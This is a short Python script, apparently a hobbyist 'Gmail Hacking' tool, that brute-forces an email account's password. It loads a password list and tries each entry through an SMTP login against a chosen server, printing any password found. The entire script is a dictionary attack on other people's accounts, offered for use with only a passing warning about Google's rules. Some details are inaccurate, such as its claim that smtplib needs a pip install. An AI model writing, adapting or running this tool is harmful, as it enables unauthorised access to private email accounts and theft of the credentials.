import os
import smtplib
import time


splash = """
█░█ █▀▀ █▀▀ ▀█▀ █▀█ █▀█ ░░█▀▄ █ ▄▀█ ▀█ 
█▀█ ██▄ █▄▄ ░█░ █▄█ █▀▄ ░░█▄▀ █ █▀█ █▄ 
presents....
El conocimiento es libre

"""
print(splash)
time.sleep(2)
os.system('clear')
verde = "\033[1;32m"
rojo = "\033[1;31m"
banner="""
##############################
#Gmail Hacking               #
#By  Kris011                 #
##############################

============Detector Fast==========
======] List for Passwords
======] smtplib connect
======] Cracking Gmail
======] Secure and Brutal Login

/\ WARNING This can infringe Google's rules for Gmail connection You can also try another service as protonmail

===} Select Service
*Gmail
*ProtonMail
Coming soon new services or aggregals in the input

===} requirements
*pip install smtplib
*list for passwords
===}

EXAMPLE
smtp.mydomain.com
password list: pass.txt
gmail: test@example.com
___________
[+] Password Found: 123456qwerty
"""
print(banner)

service = input("[service: ]")
HOST = service
server = smtplib.SMTP(HOST)
server.ehlo()
server.starttls()

user = input("[gmail: ]")
file = input("[path file passwords: ] ")
passwordFile = open(file, "r")

for password in passwordFile:
    password = password.strip('\n')
    try:
        server.login(user, password)
        print(f'{verde}[+] Password Found: %s' % password) 
    except smtplib.SMTPAuthenticationError:
        print(f'{rojo}[-] Wrond Password: %s' % password)
        
 
